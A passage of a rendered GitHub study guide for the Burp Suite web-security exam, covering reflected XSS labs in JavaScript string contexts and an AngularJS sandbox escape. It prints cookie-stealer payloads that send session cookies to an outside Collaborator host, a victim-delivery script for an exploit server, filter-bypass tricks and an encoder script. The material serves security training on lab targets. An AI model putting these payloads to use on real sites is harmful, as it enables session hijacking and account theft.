0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSubmitting a search string and reviewing the \u003ccode\u003esource code\u003c/code\u003e of the search result page, the JavaScript string variable is \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e to reflect the search string \u003ccode\u003etracker.gif\u003c/code\u003e in the \u003ccode\u003esource code\u003c/code\u003e with a variable named \u003ccode\u003esearchTerms\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;section class=blog-header\u0026gt;\n\t\u0026lt;h1\u0026gt;0 search results for 'fuzzer'\u0026lt;/h1\u0026gt;\n\t\u0026lt;hr\u0026gt;\n\u0026lt;/section\u0026gt;\n\u0026lt;section class=search\u0026gt;\n\t\u0026lt;form action=/ method=GET\u0026gt;\n\t\t\u0026lt;input type=text placeholder='Search the blog...' name=term\u0026gt;\n\t\t\u0026lt;button type=submit class=button\u0026gt;Search\u0026lt;/button\u0026gt;\n    \u0026lt;/form\u0026gt;\n    \u0026lt;/section\u0026gt;\n\t\u0026lt;script\u0026gt;\n    var searchTerms = 'fuzzer';\n    document.write('\u0026lt;img src=\u0026quot;/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\u0026quot;\u0026gt;');\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003esection\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eclass\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003eblog-header\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\t\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eh1\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e0 search results for 'fuzzer'\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eh1\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\t\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehr\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003esection\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003esection\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eclass\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003esearch\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\t\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eaction\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e/\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emethod\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003eGET\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\t\t\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003etext\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eplaceholder\u003c/span\u003e='\u003cspan class=\"pl-s\"\u003eSearch the blog...\u003c/span\u003e' \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003eterm\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\t\t\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebutton\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etype\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003esubmit\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eclass\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ebutton\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003eSearch\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebutton\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eform\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003esection\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\t\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003evar\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esearchTerms\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'fuzzer'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003ewrite\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'\u0026lt;img src=\"/resources/images/tracker.gif?searchTerms='\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003esearchTerms\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'\"\u0026gt;'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/javascript-string-reflection.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/javascript-string-reflection.png\" alt=\"JavaScript string with single quote and backslash escaped\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUsing a payload \u003ccode\u003etest'payload\u003c/code\u003e and observe that a single quote gets backslash-escaped, preventing breaking out of the string.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003ealert(1)\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eChanging the payload to a cookie stealer that deliver the session token to Burp Collaborator.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;document.location=\u0026quot;https://OASTIFY.COM/?cookie=\u0026quot;+document.cookie\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003escript\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003elocation\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"https://OASTIFY.COM/?cookie=\"\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ecookie\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/collaborator-get-cookies.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/collaborator-get-cookies.png\" alt=\"collaborator get cookies\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWhen placing this payload in \u003ccode\u003eiframe\u003c/code\u003e, the target application do not allow it to be embedded and give message: \u003ccode\u003erefused to connect\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped\" rel=\"nofollow\"\u003ePortSwigger Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn BSCP exam host the below payload on exploit server inside \u003ccode\u003e\u0026lt;script\u0026gt;\u003c/code\u003e tags, and the search query below before it is URL encoded.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;/ScRiPt \u0026gt;\u0026lt;img src=a onerror=document.location=\u0026quot;https://OASTIFY.COM/?biscuit=\u0026quot;+document.cookie\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;/ScRiPt \u0026gt;\u0026lt;img src=a onerror=document.location=\"https://OASTIFY.COM/?biscuit=\"+document.cookie\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eExploit Server hosting search term reflected vulnerability that is send to victim to obtain their session cookie.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\nlocation = \u0026quot;https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E\u0026quot;\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003elocation\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E\"\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe application gave error message \u003ccode\u003eTag is not allowed\u003c/code\u003e, and this is bypassed using this \u003ccode\u003e\u0026lt;/ScRiPt \u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eReflected String Extra Escape\u003c/h3\u003e\u003ca id=\"user-content-reflected-string-extra-escape\" class=\"anchor\" aria-label=\"Permalink: Reflected String Extra Escape\" href=\"#reflected-string-extra-escape\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSee in \u003ccode\u003esource code\u003c/code\u003e the variable named \u003ccode\u003esearchTerms\u003c/code\u003e, and when submitting payload \u003ccode\u003efuzzer'payload\u003c/code\u003e, see the single quote is backslash escaped, and then send a  \u003ccode\u003efuzzer\\payload\u003c/code\u003e payload and \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e that the backslash is not escaped.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\\'-alert(1)//  \n\nfuzzer\\';console.log(12345);//  \n\nfuzzer\\';alert(`Testing The backtick a typographical mark used mainly in computing`);//\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\\'-alert(1)//  \n\nfuzzer\\';console.log(12345);//  \n\nfuzzer\\';alert(`Testing The backtick a typographical mark used mainly in computing`);//\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUsing a single \u003cstrong\u003ebackslash\u003c/strong\u003e, single quote and \u003cstrong\u003esemicolon\u003c/strong\u003e we escape out of the JavaScript string variable, then using back ticks to enclose the \u003ccode\u003edocument.location\u003c/code\u003e path, allow for the cookie stealer to bypass application protection.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWith help from Trevor I made this into cookie stealer payload, using back ticks. Thanks Trevor, here is his Youtube walk through \u003ca href=\"https://youtu.be/Aqfl2Rj0qlU?t=598\" rel=\"nofollow\"\u003eXSS JavaScript String Angle Brackets Double Quotes Encoded Single\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/fail-escape.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/fail-escape.png\" alt=\"fail-escape\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped\" rel=\"nofollow\"\u003ePortSwigger Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eAngularJS Sandbox Escape\u003c/h3\u003e\u003ca id=\"user-content-angularjs-sandbox-escape\" class=\"anchor\" aria-label=\"Permalink: AngularJS Sandbox Escape\" href=\"#angularjs-sandbox-escape\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eExpert PortSwigger Lab exercise using AngularJS 1.4.4 and versions 1.x has reached end of life and is no longer maintained.\u003cbr\u003e\nThis lab uses \u003cstrong\u003eAngularJS\u003c/strong\u003e in an unusual way where the \u003ccode\u003e$eval\u003c/code\u003e function is not available and you will be unable to use any strings in AngularJS.\u003cbr\u003e\nObjective, perform a cross-site scripting attack that escapes the sandbox and executes the payload without using the \u003ccode\u003e$eval\u003c/code\u003e function.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://youtu.be/gKLHVT67sU0?si=tqQMb5Y6xLA-jgR4\" rel=\"nofollow\"\u003ez3nsh3ll - YouTube Video give a great explanation of this Reflected XSS with AngularJS Sandbox Escape Without Strings\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the \u003ccode\u003eangular.module\u003c/code\u003e in JavaScript source code:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/angularJS-sandbox-escape-identify.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/angularJS-sandbox-escape-identify.png\" alt=\"angularJS-sandbox-escape-identify.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe \u003ccode\u003ekey\u003c/code\u003e variable value \u003ccode\u003esearch\u003c/code\u003e is injected into the JavaScript created dynamically.\u003cbr\u003e\nNo obvious security issue present here. However, the security of this code depends on how this controller and the extracted values are used in the back-end.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe \u003ccode\u003e$parse\u003c/code\u003e method evaluates the AngularJS expression \u003ccode\u003e$scope.query\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUsing the \u003ccode\u003e\u0026amp;\u003c/code\u003e to add second key value pair to test payload dynamic code generated.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/angularJS-sandbox-escape-add-2nd-keypair.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/angularJS-sandbox-escape-add-2nd-keypair.png\" alt=\"angularJS-sandbox-escape-add-2nd-key pair\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eChanging the second added key value name to expression to determine if evaluated, \u003ccode\u003e/?search=key1value\u0026amp;7*7=payload\u003c/code\u003e and math result is 49.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/angularJS-sandbox-escape-2nd-keypair-eval.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/angularJS-sandbox-escape-2nd-keypair-eval.png\" alt=\"angularJS-sandbox-escape-2nd-key pair-eval\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eConstructing a payload fails when using \u003ccode\u003ealert()\u003c/code\u003e as the second key name in how angularJS compile the code through the parser.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection\" rel=\"nofollow\"\u003eAngulaJS sandbox - See PortSwigger Client-Side template injection documents\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings)\" rel=\"nofollow\"\u003ePortSwigger CheatSheet Reference Sandbox 1.4.4 escape\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"1\u0026amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e1\u0026amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCollaborator payload \u003cem\u003e\u003cstrong\u003ecookie stealer\u003c/strong\u003e\u003c/em\u003e:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"x=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ex=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe ASCII decimal values for each character in the above payload string, separated by commas. Each number represents the ASCII decimal value of the corresponding character in the payload string.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePython script to convert any payload to ASCIII decimal values:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"import sys\n\nprint('Python String to ASCII Converter!')\nif len(sys.argv) != 2:\n    print(\u0026quot;Usage: Python ascii_converter.py 'Payload_String'\u0026quot;)\n    sys.exit(1)\n\ninput_string = sys.argv[1]\nascii_values = [str(ord(char)) for char in input_string]\n\noutput = \u0026quot;,\u0026quot;.join(ascii_values)\nprint(output)\nprint('PortSwigger Expert Academy Labs!')\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eimport\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esys\u003c/span\u003e\n\n\u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'Python String to ASCII Converter!'\u003c/span\u003e)\n\u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003esys\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eargv\u003c/span\u003e) \u003cspan class=\"pl-c1\"\u003e!=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e:\n    \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"Usage: Python ascii_converter.py 'Payload_String'\"\u003c/span\u003e)\n    \u003cspan class=\"pl-s1\"\u003esys\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eexit\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e)\n\n\u003cspan class=\"pl-s1\"\u003einput_string\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esys\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eargv\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e]\n\u003cspan class=\"pl-s1\"\u003eascii_values\u003c/span\u003e \u003cspan 